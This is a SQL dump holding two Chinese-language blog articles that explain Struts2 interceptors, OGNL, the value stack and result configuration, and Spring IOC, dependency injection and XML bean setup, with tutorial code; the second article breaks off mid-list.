INSERT INTO `article` VALUES (35, 1, 'Struts2重要机制和配置', '2018/11/1541142935_5deb64dcc0940e751702650b1bd2c954.jpg', '# 前言\r\n同上一篇Hibernate,本篇也只用作记录重要机制原理和配置\r\n***\r\n##### Struts2是一个web控制接口层的应用框架,它的核心实现思想是*面向切面编程(AOP)*,其主要实现方式是通过*底层Filter过滤器*进行请求拦截框架处理,随后通过struts定义的*拦截器*对请求进行逐级处理,struts2的内置拦截器实现有将近40个  \r\n##### struts2框架上是典型的*洋葱模型*实现的框架,源码很具有学习参考性,它的实现很像nodeJs的web框架koa2,内部的递归调用和拦截器功能的单一责任制非常具有源码学习性   \r\n##### struts2数据处理采用了*值栈结构*,非常的巧妙 \r\n### struts2的优点\r\n1. 自动封装参数,采用压栈方式\r\n2. 表单的防止重复提交\r\n3. 线程是安全(每次请求都会重新创建Action类)\r\n##### struts1线程是不安全的,因为struts1依靠servlet实现,而servlet恰恰是线程不安全的\r\n4. 架构原理简单\r\n\r\n### struts2的缺点\r\n- 过时的技术,差距当今主流技术15年\r\n- 曾有过严重漏洞(可以百度到)\r\n- 依赖于传统JSP,JSP过时了\r\n- 学习成本较大\r\n- 配置繁琐,整合性差\r\n\r\n### 总结特点\r\n1. struts2是很老的框架,在曾经据说是很火热的框架\r\n2. 它在当时取代了servlet这种low逼又缓慢的开发节奏\r\n3. 实现了与JSP的完整融合,struts实现了一套标签库\r\n4. 配合Spring,Hibernate,JSP,组成SSH,获得不错的开发体验\r\n\r\n\r\n- struts2真的很过时,新项目用这东西直接吐血\r\n- 相对于SpringMvc学习成本太高了\r\n- 相对于jeysey的restful接口层,太笨重了\r\n- 整合性差,教程少\r\n- JSP很Low逼(*PS:模板引擎freemakrer等出现,加上Vue,React,Angular的出现,显示JSP很Low*)\r\n\r\n\r\n## AOP思想\r\nAOP思想就是纵向重复代码,横向抽取\r\n1. *把重复的事情在一个地方完成*\r\n2. *杜绝冗余性代码,组件化的道理,高复用的道理*\r\n3. *便于维护完善升级*\r\n\r\n![aop.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544851018_aop.png)\r\n\r\n### 体现\r\n1. 拦截器 \r\n2. 网关\r\n3. nginx\r\n4. 动态代理模式(*这个模式非常非常非常重要,优化代码,理解框架与造轮子非常有用*)\r\n\r\n## struts2架构\r\nstruts2的核心就是AOP,就是拦截器\r\n![struts2.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544851018_struts2.png)\r\n### 主要流程\r\n1. *ActionProxy*读取开发者的配置文件\r\n2. 当请求过来时,ActionProxy根据配置数据规则交给*ActionInvocation*处理\r\n3. 经过一大串的拦截器处理,到达开发者编写的方法\r\n4. 根据开发者返回的结果进行页面跳转\r\n5. 期间会将请求的数据进行压栈\r\n6. *开发者编写的处理Action每次请求都会创建*,struts2利用这点实现压栈数据线程安全\r\n\r\n### 颜色\r\n1. 红色: 自己配置\r\n2. 绿色: 可默认可自定义\r\n\r\n## ActionContext\r\nActionContext可以获得原生web中几乎所有的对象,它是struts2获得web对象的核心方法\r\n```java\r\n    // 获得原生web对象\r\n    @Override\r\n    public String execute() throws Exception {\r\n        ServletActionContext.getRequest();\r\n        ServletActionContext.getResponse();\r\n        ServletActionContext.getRequest().getSession();\r\n        ServletActionContext.getServletContext();\r\n        ServletActionContext.getServletContext();\r\n        return \"success\";\r\n    }\r\n    // 获得struts2包装后的web对象\r\n    @Override\r\n    public String execute() throws Exception {\r\n        // 原生request域 -> map\r\n        Map<String, Object> requestScope = (Map<String, Object>) ActionContext.getContext().get(\"request\");\r\n        // request与ActionContext生命周期一样,ActionContext本身就是包装后的request\r\n        ActionContext.getContext().put(\"name\", \"requestValue\");\r\n        // session域 -> map\r\n        ActionContext.getContext().getSession().put(\"name\", \"sessionValue\");\r\n        // application域  -> map\r\n        ActionContext.getContext().getApplication().put(\"name\", \"applicationValue\");\r\n        // valueStack\r\n        ActionContext.getContext().getValueStack();\r\n        return \"success\"; \r\n    }\r\n```\r\n***\r\nActionContext包含以下对象\r\n![actionContext.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544851018_actionContext.png)\r\n\r\n### EL的11个内置对象\r\n- *pageScope*: 获取jsp中pageContext域属性，相当于pageContext.getAttribute(\"xxx\"))\r\n- *requestScope*: 获取request域属性 \r\n- *sessionScope*: 获取session域属性\r\n- *applicationScope*: 获取application域属性，相当于application.getAttribute(\"xxx\")\r\n- *param*: 它是一个Map，其中key是参数，value是参数值，适用于单值的参数,相当于request.getParameter(\"xxx\")\r\n- *paramValues*: 它是一个Map，其中key是参数，value是多个参数值，适用于多值的参数，相当request.getParameterValues(\"xxx\")\r\n- *header*: 对应请求头，它是一个Map，其中key表示头名称，value是单个头值，适用于单值的请求头，相当于request.getHeader(\"xxx\")\r\n- *headerValues*: 对应请求头，它是一个Map，其中key表示头名称，value是多个头值，适用于多值的请求头，相当于request.getHeaders(\"xxx\")\r\n- *initParam*: 获取web.xml中<context-param>内的参数，${ initParam.xxx}，xxx就是<param-name>标签内的值，进而得到<param-value>中的值\r\n- *cookie*: 用于获取cookie，Map<String,Cookie>，其中key是cookie的name，value是cookie对象，例如${cookie.JSESSIONID.value }就是获取sessionId \r\n- *pageContext*: 可以获取JSP九大内置对象，相当于使用该对象调用getxxx()方法，例如pageContext.getRequest()可以写为${pageContext.request) \r\n\r\n### JSP的9个内置对象\r\n1. *application*: 主要用于保存用户信息，代码片段的运行环境,它是一个共享的内置对象，即一个容器中的多个用户共享一个application对象，故其保存的信息被所有用户所共享.\r\n2. *session*: 主要用于来分别保存每个用户信息，与请求关联的会话 \r\n3. *request*: 主要用于接受客户端通过HTTP协议连接传输到服务器端的数据\r\n4. *response*: 主要用于向客户端发送数据\r\n5. *page*: 处理JSP网页，是Object类的一个实例，指的是JSP实现类的实例，即它也是JSP本身，只有在JSP页面范围之内才是合法的。\r\n6. *pageContext*: 管理网页属性,为JSP页面包装页面的上下文，管理对属于JSP中特殊可见部分中已命名对象的访问，它的创建和初始化都是由容器来完成的\r\n7. *out*: 主要用于向客户端输出数据; Out的基类是JspWriter\r\n8. *config*: 代码片段配置对象，表示Servlet的配置\r\n9. *exception*: 处理JSP文件执行时发生的错误和异常\r\n\r\n## OGNL与valueStack\r\n### OGNL\r\nOGNL是一种表达式语言,像模板解析引擎一样,不过功能挺强大  \r\n#### OGNL包含*root和context*两个存放值的地方\r\n```java\r\n    // root取值\r\n    @Test\r\n    public void fun2() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        User rootUser = new User(\"t\", 18);\r\n        oc.setRoot(rootUser);\r\n        \r\n        // 取出root中user对象的name,没有#字符\r\n        String name = (String) Ognl.getValue(\"name\", oc, oc.getRoot());\r\n        Integer age = (Integer) Ognl.getValue(\"age\", oc, oc.getRoot());\r\n        System.out.println(name +\",\"+age);\r\n    }\r\n    // context取值\r\n    @Test\r\n    public void fun3() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        \r\n        Map<String, User> context = new HashMap<String, User>();\r\n        context.put(\"user1\", new User(\"j\", 18));\r\n        context.put(\"user2\", new User(\"r\", 22));\r\n        oc.setValues(context);\r\n        \r\n        // 取出root中user对象的name\r\n        String name = (String) Ognl.getValue(\"#user1.name\", oc, oc.getRoot());\r\n        String name2 = (String) Ognl.getValue(\"#user2.name\", oc, oc.getRoot());\r\n        Integer age = (Integer) Ognl.getValue(\"#user2.age\", oc, oc.getRoot());\r\n        System.out.println(name);\r\n        System.out.println(name2);\r\n        System.out.println(age);\r\n    }\r\n    // 赋值并取值\r\n    @Test\r\n    public void fun4() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        User rootUser = new User(\"t\", 18);\r\n        oc.setRoot(rootUser);\r\n        \r\n        Map<String, User> context = new HashMap<String, User>();\r\n        context.put(\"user1\", new User(\"j\", 18));\r\n        context.put(\"user2\", new User(\"r\", 22));\r\n        oc.setValues(context);\r\n        \r\n        Ognl.getValue(\"name=\'jerry\'\", oc, oc.getRoot());\r\n        String name = (String) Ognl.getValue(\"name\", oc, oc.getRoot());\r\n        System.out.println(name);\r\n        \r\n        String name2 = (String) Ognl.getValue(\"#user1.name=\'s\',#user1.name\", oc, oc.getRoot());\r\n        System.out.println(name2);\r\n    }\r\n    // 实例方法\r\n    @Test\r\n    public void fun5() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        User rootUser = new User(\"t\", 18);\r\n        oc.setRoot(rootUser);\r\n        \r\n        Map<String, User> context = new HashMap<String, User>();\r\n        context.put(\"user1\", new User(\"j\", 18));\r\n        context.put(\"user2\", new User(\"r\", 22));\r\n        oc.setValues(context);\r\n        \r\n        Ognl.getValue(\"setName(\'lilei\')\", oc, oc.getRoot());;\r\n        String name = (String) Ognl.getValue(\"getName()\", oc, oc.getRoot());\r\n        System.out.println(name);\r\n        \r\n        String name2 = (String) Ognl.getValue(\"#user1.setName(\'lucy\'),#user1.getName()\", oc, oc.getRoot());\r\n        System.out.println(name2);\r\n    }\r\n    // 调用静态方法\r\n    @Test\r\n    public void fun6() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        User rootUser = new User(\"t\", 18);\r\n        oc.setRoot(rootUser);\r\n        \r\n        Map<String, User> context = new HashMap<String, User>();\r\n        context.put(\"user1\", new User(\"j\", 18));\r\n        context.put(\"user2\", new User(\"r\", 22));\r\n        oc.setValues(context);\r\n        \r\n        String name = (String) Ognl.getValue(\"@root.model.WtUtils@echo(\'hh\')\", oc, oc.getRoot());\r\n        Double pi = (Double) Ognl.getValue(\"@java.lang.Math@PI\", oc, oc.getRoot());\r\n        System.out.println(name);\r\n        System.out.println(pi);\r\n    }\r\n    // 创建list|map\r\n    @Test\r\n    public void fun7() throws Exception {\r\n        OgnlContext oc = new OgnlContext();\r\n        User rootUser = new User(\"t\", 18);\r\n        oc.setRoot(rootUser);\r\n        \r\n        Map<String, User> context = new HashMap<String, User>();\r\n        context.put(\"user1\", new User(\"j\", 18));\r\n        context.put(\"user2\", new User(\"r\", 22));\r\n        oc.setValues(context);\r\n        \r\n        Integer size = (Integer) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}.size()\", oc, oc.getRoot());\r\n        String name = (String) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}[0]\", oc, oc.getRoot());\r\n        String name2 = (String) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}.get(1)\", oc, oc.getRoot());\r\n        System.out.println(size);\r\n        System.out.println(name);\r\n        System.out.println(name2);\r\n        \r\n        Integer size2 = (Integer) Ognl.getValue(\"#{\'name\':\'tom\',\'age\':\'18\'}.size()\", oc, oc.getRoot());\r\n        String name3 = (String) Ognl.getValue(\"#{\'name\':\'tom\',\'age\':\'18\'}[\'name\']\", oc, oc.getRoot());\r\n        System.out.println(name3);\r\n        \r\n    }\r\n```\r\n能取值赋值,调用方法,创建list|map,看上去很强大,但实际能用的只有赋值\r\n### valueStack\r\nstruts2的valueStack值栈实际就是ognl对象,包含root和context\r\n所以valueStack即是struts2的ognl对象,JSP中使用ognl表达式即可取值(*PS:El表达式也可以*)\r\n## 请求与返回\r\n### 请求\r\n![strutsmode.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544851741_strutsmode.png)\r\nstruts2主要是利用valueStack来进行数据的封装\r\n```java\r\npublic class Param3Action extends ActionSupport implements ModelDriven<User>{\r\n    // 准备user对象\r\n    private User user = new User();\r\n    \r\n    @Override\r\n    public String execute() throws Exception {\r\n        System.out.println(user);\r\n        return \"success\";\r\n    }\r\n    @Override\r\n    public User getModel() {\r\n        return user;\r\n    }\r\n} \r\n```\r\n页面\r\n```java\r\n<form action=\"${pageContext.request.contextPath}/Param3Action\">\r\n    用户名:<input type=\"text\" name=\"name\" /><br>\r\n    年龄:<input type=\"text\" name=\"age\" /><br>\r\n    生日:<input type=\"text\" name=\"birthday\" /><br>\r\n    <input type=\"submit\" value=\"提交\" />\r\n</form> \r\n```\r\nstruts.xml\r\n```xml\r\n<action name=\"Param3Action\" class=\"root.param.Param3Action\" method=\"execute\" >\r\n    <result name=\"success\" type=\"dispatcher\">/form3.jsp</result>\r\n</action> \r\n```\r\nstruts2会将请求数据压入栈中并封装在action的数据对象中\r\n\r\n1. ognl与struts2结合关键就在valueStack(相当于OgnlContext)\r\n2. 在取栈中的属性时,会从栈顶开始找属性,找不到会继续向下找,找到就停止\r\n3. 默认情况下,栈中放置当前访问的Action对象\r\n4. request.getAttribute查找顺序\r\n##### 原生request域 => 查找valueStack的Root部分 => 查找valueStack的Context部分\r\n\r\n### 返回\r\nstruts2根据结果字符串判定返回结果,其中有*返回类型*,所有返回类型如下\r\n![TIM截图20181102190018.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541156428_TIM截图20181102190018.png)\r\n常用的返回类型有四种\r\n```xml\r\n<package name=\"result\" namespace=\"/\" extends=\"struts-default\" >\r\n    <!-- 转发 -->\r\n    <action name=\"ResultAction\" class=\"root.result.ResultAction\" method=\"execute\" >\r\n        <result name=\"success\" type=\"dispatcher\">hello.jsp</result>\r\n    </action>\r\n    <!-- 重定向 -->\r\n    <action name=\"Result2Action\" class=\"root.result.Result2Action\" method=\"execute\" >\r\n        <result name=\"success\" type=\"redirect\">hello.jsp</result>\r\n    </action>\r\n    <!-- 转发到Action -->\r\n    <action name=\"Result3Action\" class=\"root.result.Result3Action\" method=\"execute\" >\r\n        <result name=\"success\" type=\"chain\">\r\n            <param name=\"actionName\">ResultAction</param>\r\n            <param name=\"namespace\">/</param>\r\n        </result>\r\n    </action>\r\n    <!-- 重定向到Action -->\r\n    <action name=\"Result4Action\" class=\"root.result.Result4Action\" method=\"execute\" >\r\n        <result name=\"success\" type=\"redirectAction\">\r\n            <param name=\"actionName\">ResultAction</param>\r\n            <param name=\"namespace\">/</param>\r\n        </result>\r\n    </action>\r\n</package>\r\n``` \r\n*记录一下重定向与转发的区别*\r\n#### 转发\r\n1. 转发,转发是在服务器端转发的，客户端是不知道的\r\n##### request.getRequestDispatcher(\"/aj.jsp\").forward(request, response);\r\n2. 请求转发是服务器内部把对一个request/response的处理权，移交给另外一个请求.对于客户端而言，它只知道自己最早请求的那个A，而不知道中间的B，甚至C、D。 *传输的信息不会丢失*\r\n##### 客户首先发送一个请求到服务器端，服务器端发现匹配的servlet，并指定它去执行，当这个servlet执行完之后，它要调用getRequestDispacther()方法，把请求转发给指定的aj.jsp,整个流程都是在服务器端完成的，而且是在同一个请求里面完成的，因此servlet和jsp共享的是同一个request，在servlet里面放的所有东西，在aj中都能取出来，因此，aj能把结果getAttribute()出来，getAttribute()出来后执行完把结果返回给客户端。*整个过程是一个请求，一个响应* \r\n--------------------- \r\n#### 重定向\r\n1. 重定向，*不会共享request*\r\n##### response.sendRedirect(request.getContextPath() + \"/bj.jsp\");\r\n##### 客户发送一个请求到服务器，服务器匹配servlet，这都和请求转发一样，servlet处理完之后调用了sendRedirect()这个方法，这个方法是response的方法，所以，当这个servlet处理完之后，看到response.senRedirect()方法，立即向客户端返回这个响应，响应行告诉客户端你必须要再发送一个请求，去访问bj.jsp，紧接着客户端受到这个请求后，立刻发出一个新的请求，去请求bj.jsp,这里两个请求互不干扰，相互独立，在前面request里面setAttribute()的任何东西，在后面的request里面都获得不了。可见，在sendRedirect()里面是*两个请求，两个响应*\r\n---------------------\r\n### 总结重定向与转发\r\n1. 转发在服务器端完成的；重定向是在客户端完成的\r\n2. 转发的速度快；重定向速度慢\r\n3. 转发的是同一次请求；重定向是两次不同请求\r\n4. 转发不会执行转发后的代码；重定向会执行重定向之后的代码\r\n5. 转发地址栏没有变化；重定向地址栏有变化\r\n6. 转发必须是在同一台服务器下完成；重定向可以在不同的服务器下完成\r\n7. Forward是在服务器端的跳转，就是客户端一个请求发给服务器，服务器直接将请求相关的参数的信息原封不动的传递到该服务器的其他jsp或servlet去处理，而sendredirect是在客户端的跳转，服务器会返回给客户端一个响应报头和新的URL地址，原来的参数什么的信息如果服务器端没有特别处理就不存在了，浏览器会访问新的URL所指向的servlet或jsp，这可能不是原先服务器上的webservce了\r\n\r\n## 核心配置\r\n#### web.xml核心过滤器配置\r\n```xml\r\n<filter>\r\n    <filter-name>struts2</filter-name>\r\n    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>\r\n</filter>\r\n<filter-mapping>\r\n    <filter-name>struts2</filter-name>\r\n    <url-pattern>/*</url-pattern>\r\n</filter-mapping>\r\n```\r\n#### struts.xml映射配置\r\n```xml\r\n<!-- package:将Action配置封装.就是可以在Package中配置很多action.\r\n    name属性: 给包起个名字,起到标识作用.随便起.不能其他包名重复.(区分业务模块,相当于SpringMvc类上的controller)\r\n    namespace属性:给action的访问路径中定义一个命名空间(区分业务模块,相当于SpringMvc类上的RequestMapping)\r\n    extends属性: 继承一个 指定包,默认(struts-default.xml)\r\n    abstract属性:包是否为抽象的; 标识性属性.标识该包不能独立运行.专门被继承\r\n-->\r\n    <package name=\"hello\" namespace=\"/hello\" extends=\"struts-default\" >\r\n        <!-- action元素:配置action类\r\n                name属性: 决定了Action访问资源名.(区分方法,相当于SpringMvc方法上的RequestMapping)\r\n                class属性: action的完整类名\r\n                method属性: 指定调用Action中的哪个方法来处理请求\r\n         --> \r\n        <action name=\"hellotest\" class=\"root.action.HelloAction\" method=\"hello\" >\r\n        <!-- result元素:结果配置 \r\n                            name属性: 标识结果处理的名称.与action方法的返回值对应.\r\n                            type属性: 指定调用哪一个result类来处理结果,默认使用转发.\r\n                            标签体:填写页面的相对路径\r\n        -->\r\n                <result name=\"success\" type=\"dispatcher\" >/hello.jsp</result>\r\n        </action> \r\n    </package>  \r\n```\r\n#### 引入其他struts文件,便于模块化 \r\n```xml\r\n<include file=\"root/dynamic/struts.xml\"></include>\r\n```\r\n#### 动态方法占位符配置\r\n```xml\r\n<action name=\"Demo1Action_*\" class=\"root.dynamic.Demo1Action\" method=\"{1}\" >\r\n    <result name=\"success\" >/hello.jsp</result>\r\n</action> \r\n```\r\n#### 常用常量配置\r\n```xml\r\n<!-- i18n:国际化. 解决post提交乱码 -->\r\n<constant name=\"struts.i18n.encoding\" value=\"UTF-8\"></constant>\r\n<!-- 指定反问action时的后缀名 -->\r\n<constant name=\"struts.action.extension\" value=\"action,,do\"></constant>\r\n<!-- 指定struts2是否以开发模式运行(热部署)\r\n    1.热加载主配置.(不需要重启即可生效)\r\n    2.提供更多错误信息输出,方便开发时的调试\r\n--> \r\n<constant name=\"struts.devMode\" value=\"true\"></constant>\r\n<!-- 配置动态方法调用是否开启常量\r\n    默认是关闭的,需要开启\r\n-->\r\n<constant name=\"struts.enable.DynamicMethodInvocation\" value=\"false\"></constant>\r\n```\r\n#### 全局异常处理\r\n```xml\r\n<global-exception-mappings>\r\n    <!-- 如果出现java.lang.RuntimeException异常,就将跳转到名为error的结果 -->\r\n    <exception-mapping result=\"error\" exception=\"java.lang.RuntimeException\"></exception-mapping>\r\n</global-exception-mappings>\r\n```\r\n#### 全局结果处理\r\n```xml\r\n<global-results>\r\n    <result name=\"toLogin\" type=\"redirect\">/login.jsp</result>      \r\n</global-results>\r\n```\r\n#### 定义拦截器\r\n```java\r\npublic class LoginInterceptor extends MethodFilterInterceptor {\r\n    @Override\r\n    protected String doIntercept(ActionInvocation invocation) throws Exception {\r\n        Map<String, Object> session = ActionContext.getContext().getSession();\r\n        Object object = session.get(\"user\");\r\n        if (object == null) {\r\n            return \"toLogin\";\r\n        } else {\r\n            return invocation.invoke();\r\n        }\r\n    }\r\n}\r\n``` \r\n#### 注册拦截器\r\n```xml\r\n<interceptors>\r\n            <interceptor name=\"loginInterceptor\" class=\"root.web.interceptor.LoginInterceptor\"></interceptor>\r\n    <interceptor-stack name=\"myStack\">\r\n    <!-- 自定义拦截器引入 -->\r\n    <interceptor-ref name=\"loginInterceptor\">\r\n        <!-- 指定哪些方法不拦截 -->\r\n        <param name=\"excludeMethods\">login</param>\r\n        <!-- 指定哪些方法需要拦截 -->\r\n        <param name=\"includeMethods\">add,delete</param>\r\n    </interceptor-ref>\r\n    <!-- 引用默认35个拦截器 -->\r\n    <interceptor-ref name=\"defaultStack\"></interceptor-ref>\r\n    </interceptor-stack>\r\n</interceptors>\r\n<!-- 默认包中拦截器栈 -->\r\n<default-interceptor-ref name=\"myStack\"></default-interceptor-ref> \r\n```', 1, 0, 59, 0, 0, '2018-11-02 15:17:14', '2019-02-22 00:24:38', 0, 0);
INSERT INTO `article` VALUES (36, 1, 'spring重要机制与配置', '2018/11/1541316304_ae7a7e662981336dc06eeb40f89b5a5d.jpg', '# 前言\r\n本文记录spring概念与配置\r\n***\r\n### spring是什么\r\n1. spring是一个*容器*\r\n2. spring负责管理项目中的所有对象\r\n3. 不仅排斥其他框架,还能帮其他框架管理对象(所以它强大,*整合性强*)\r\n4. 容器性质,解决复杂性,看作是项目中对象的管家\r\n\r\n### spring能干嘛\r\n1. 解决复杂性,解耦,管理控制对象\r\n2. 整合性强,整合几乎所有优秀框架与库\r\n3. 版本更新迭代速度快,Spring全家桶排万难\r\n4. 同类开源项目火热趋势\r\n5. web项目几乎的必备品\r\n6. 实现思想非常优秀,源码学习性大\r\n\r\n## IOC,DI\r\n### IOC\r\n1. InverseOfControl*反转控制*\r\n2. 将我们创建对象的方式反转了\r\n3. 使用了spring之后,对象的创建以及依赖关系可以由spring完成创建以及注入\r\n4. 反转控制就是反转了对象的创建方式,从我们自己创建反转给了Spring(不要被高大上的名词带偏了,IOC就是spring帮我们*反射创建对象*,便于管理控制)\r\n\r\n### DI\r\n1. DependencyInjection 依赖注入\r\n2. 实现IOC思想需要DI作支持\r\n3. 注入方式:set方法,构造方法,字段注入\r\n4. 注入类型:值类型注入(8大基本数据类型),引用类型注入(将依赖对象注入)\r\n5. 就是将属性数据*注入目标中*,运用set,构造或者反射字段\r\n\r\n### 注册创建对象属性\r\n注解对象一般情况下是采用*注解方式*,但还是需要记录一下配置信息\r\n```xml\r\n<!-- 将User对象交给spring容器管理 -->\r\n<!-- Bean元素:使用该元素描述需要spring容器管理的对象 \r\n	class属性:被管理对象的完整类名. \r\n	name属性:给被管理的对象起个名字.获得对象时根据该名称获得对象. 可以重复.可以使用特殊字符. \r\n	id属性: 与name属性一模一样. 名称不可重复.被作为唯一引用,不能使用特殊字符. 结论: 尽量使用name属性. \r\n	init-method属性: 配置一个方法作为生命周期初始化方法,spring会在对象创建之后调用\r\n	destroy-method属性: 配置一个方法作为生命周期销毁方法,spring容器在关闭并销毁所有容器中的对象之前调用\r\n	scope属性: \r\n		singleton(默认值): 单例对象,被标识为单例的对象在spring容器中只会存在一个实例 \r\n		prototype: 多例原型,被标识为多例的对象,*每次再获得时才会创建*,每次创建都是新的对象(整合struts2的Action等相似对象时使用)\r\n		request: web环境下,对象与request生命周期一致(无用处)\r\n		session: web环境下,对象与session生命周期一致(无用处)\r\n	-->\r\n<bean id=\"user\" name=\"user\" class=\"root.model.User\" \r\ninit-method=\"init\" destroy-method=\"destory\" scope=\"singleton\"></bean>\r\n<!-- 导入其他spring配置文件,分模块化时 -->\r\n<import resource=\"root/create/applicationContext.xml\" />\r\n```\r\n### 创建对象的方式 \r\n```xml\r\n<!-- 创建方式1:空参构造创建  -->\r\n<bean  name=\"user\" class=\"root.model.User\" init-method=\"init\" destroy-method=\"destory\" scope=\"singleton\"></bean>\r\n<!-- 创建方式2:静态工厂创建 \r\n	调用UserFactory的createUser方法创建名为user2的对象.放入容器\r\n -->\r\n<bean  name=\"user2\" class=\"root.create.UserFactory\" factory-method=\"createUser\" ></bean>\r\n<!-- 创建方式3:实例工厂创建 \r\n	调用UserFactory对象的createUser2方法创建名为user3的对象.放入容器-->\r\n<bean  name=\"user3\" factory-bean=\"userFactory\" factory-method=\"createUser2\" ></bean>\r\n<bean  name=\"userFactory\" class=\"root.create.UserFactory\"></bean> \r\n```\r\n### 属性注入\r\n```xml\r\n<!-- set方式注入: -->\r\n	<bean  name=\"user\" class=\"root.model.User\" >\r\n		<!--值类型注入: 为User对象中名为name的属性注入tom作为值 -->\r\n		<property name=\"name\" value=\"tom\" ></property>\r\n		<property name=\"age\"  value=\"18\" ></property>\r\n		<!-- 引用类型注入: 为car属性注入下方配置的car对象 -->\r\n		<property name=\"car\"  ref=\"car\" ></property>\r\n	</bean>\r\n	<!-- 将car对象配置到容器中 -->\r\n	<bean name=\"car\" class=\"root.model.Car\" >\r\n		<property name=\"name\" value=\"兰博基尼\" ></property>\r\n		<property name=\"color\" value=\"黄色\" ></property>\r\n	</bean>\r\n```\r\n```xml\r\n<!-- 构造函数注入 -->\r\n	<bean name=\"user2\" class=\"root.model.User\" >\r\n		<!-- name属性: 构造函数的参数名 -->\r\n		<!-- index属性: 构造函数的参数索引 -->\r\n		<!-- type属性: 构造函数的参数类型-->\r\n		<constructor-arg name=\"name\" index=\"0\" type=\"java.lang.Integer\" value=\"999\"  ></constructor-arg>\r\n		<constructor-arg name=\"car\" ref=\"car\" index=\"1\" ></constructor-arg>\r\n	</bean> \r\n```\r\n```xml\r\n<!-- p名称空间注入, 走set方法\r\n		1.导入P名称空间  xmlns:p=\"http://www.springframework.org/schema/p\"\r\n		2.使用p:属性完成注入\r\n			|-值类型: p:属性名=\"值\"\r\n			|-对象类型: p:属性名-ref=\"bean名称\"\r\n	 -->\r\n	<bean  name=\"user3\" class=\"root.model.User\" p:name=\"jack\" p:age=\"20\" p:car-ref=\"car\"  >\r\n	</bean> \r\n```\r\n```xml\r\n<!--  \r\n	spel注入: spring Expression Language sping表达式语言 -->\r\n	<bean  name=\"user4\" class=\"root.model.User\" >\r\n		<property name=\"name\" value=\"#{user.name}\" ></property>\r\n		<property name=\"age\" value=\"#{user3.age}\" ></property>\r\n		<property name=\"car\" ref=\"car\" ></property>\r\n	</bean> \r\n```\r\n```xml\r\n<!-- 复杂类型注入 -->\r\n	<bean name=\"cb\" class=\"root.injection.CollectionBean\" >\r\n		<!-- 如果数组中只准备注入一个值(对象),直接使用value|ref即可 \r\n		<property name=\"arr\" value=\"tom\" ></property>\r\n		-->\r\n		<!-- array注入,多个元素注入 -->\r\n		<property name=\"arr\">\r\n			<array>\r\n				<value>tom</value>\r\n				<value>jerry</value>\r\n				<ref bean=\"user4\" />\r\n			</array>\r\n		</property>\r\n		\r\n		<!-- 如果List中只准备注入一个值(对象),直接使用value|ref即可 \r\n		<property name=\"list\" value=\"jack\" ></property>-->\r\n		<property name=\"list\"  >\r\n			<list>\r\n				<value>jack</value>\r\n				<value>rose</value>\r\n				<ref bean=\"user3\" />\r\n			</list>\r\n		</property>\r\n		<!-- map类型注入 -->\r\n		<property name=\"map\"  >\r\n			<map>\r\n				<entry key=\"url\" value=\"jdbc:mysql:///crm\" ></entry>\r\n				<entry key=\"user\" value-ref=\"user4\"  ></entry>\r\n				<entry key-ref=\"user3\" value-ref=\"user2\"  ></entry>\r\n			</map> \r\n		</property>\r\n		<!-- prperties 类型注入 -->\r\n		<property name=\"prop\"  >\r\n			<props>\r\n				<prop key=\"driverClass\">com.jdbc.mysql.Driver</prop>\r\n				<prop key=\"userName\">root</prop>\r\n				<prop key=\"password\">1234</prop>\r\n			</props>\r\n		</property>\r\n	</bean> \r\n```\r\n\r\n\r\n### BeanFactory\r\n![TIM截图20181104155432.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541318210_TIM截图20181104155432.png)\r\n1. BeanFactory: spring顶级原始接口,针对原始接口的实现类功能较为单一\r\n2. BeanFactory接口实现类的容器,特点是*每次在获得对象时才会创建对象*(硬件资源匮乏时代)\r\n\r\n### ApplicationContext\r\n![TIM截图20181104160251.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541318591_TIM截图20181104160251.png)\r\n```java\r\n// 开启spring容器\r\nClassPathXmlApplicationContext ac = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\r\n// 获取容器中的对象\r\nUser u = (User) ac.getBean(\"user\");\r\n// 关闭容器\r\nac.close()\r\n```\r\n1. 每次容器*启动时就会创建容器中配置的所有对象*\r\n2. 从类路径下加载配置文件:ClassPathXmlApplicationContext\r\n3. 硬盘绝对路径下加载配置文件:FileSystemXmlApplicationContext\r\n4. web开发中,使用applicationContext,在资源匮乏的环境(开发板)可以使用BeanFactory \r\n\r\n### 配置容器生命周期\r\n##### 显然,每次从ClassPathXmlApplicationContext中获取造成*对象资源问题*,我们希望整个项目中只有一个ApplicationContext用来获取Bean对象,而不是每次创建一个ApplicationContext,我们希望*spring随项目启动而创建,随项目销毁而销毁*,且只有一个   \r\n##### javaWeb三大核心组件中的*listener*可以很好的满足这个需求,spring考虑到这点提供一个实现需求的listener\r\n```xml\r\n<!-- 让spring随web启动而创建的监听器 -->\r\n  <listener>\r\n  	<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\r\n  </listener>\r\n  <!-- 配置spring配置文件位置参数 -->\r\n  <context-param>\r\n  	<param-name>contextConfigLocation</param-name>\r\n  	<param-value>classpath:applicationContext.xml</param-value>\r\n  </context-param> \r\n```\r\n## Spring注解\r\n### 开启注解\r\n```xml\r\n<!-- 指定扫描root包下的所有类中的注解. 注意:扫描包时.会扫描指定报下的所有子孙包 -->\r\n<context:component-scan base-package=\"root\"></context:component-scan>\r\n```\r\n### 常用注解\r\n```java\r\n@Component: 注册对象\r\n@Controller: 注册并表明这是接口层对象\r\n@Service: 注册并表明这是业务层对象\r\n@Repository: 注册并表明这是持久层对象\r\n@Mapper: 注册Mybatis的代理接口\r\n@RestController: Controller+RequestMapping\r\n@RequestMapping: 支持所有方法的请求映射\r\n@GetMapping: 仅支持Get请求映射\r\n@Configuration: 注册为一个配置类对象\r\n@Bean: 